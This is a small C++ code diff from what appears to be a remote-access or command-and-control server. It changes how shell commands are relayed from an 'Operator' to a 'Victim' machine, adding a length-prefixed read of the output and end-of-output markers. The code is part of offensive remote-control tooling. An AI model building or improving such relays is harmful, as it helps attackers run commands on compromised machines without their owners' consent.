@@ -5,6 +5,7 @@
 
 #include <Remote.hpp>
 #include <Server.hpp>
+#include <chrono>
 #include <cstdint>
 #include <map>
 #include <memory>
@@ -106,9 +107,16 @@ public:
                 logger::debug("Shell Command From Operator: [{}]", cmd);
                 vic->sendline(cmd);
 
-                const auto output = trim_string(vic->recvline());
-                logger::debug("Output from Victim: [{}]", output);
-                op->sendline(output);
+                const auto output_size = std::atol(trim_string(vic->recvline()).c_str());
+                logger::debug("Output Size: [{}]", output_size);
+
+                if (output_size > 0) {
+                    const auto output = trim_string(vic->recv(output_size));
+                    logger::debug("Output from Victim: [{}]", output);
+                    op->sendline(output + "_MLVX_END");
+                } else {
+                    op->sendline("MLVX_NODATA_MLVX_END");
+                }
 
                 std::this_thread::sleep_for(std::chrono::milliseconds(5));
             }
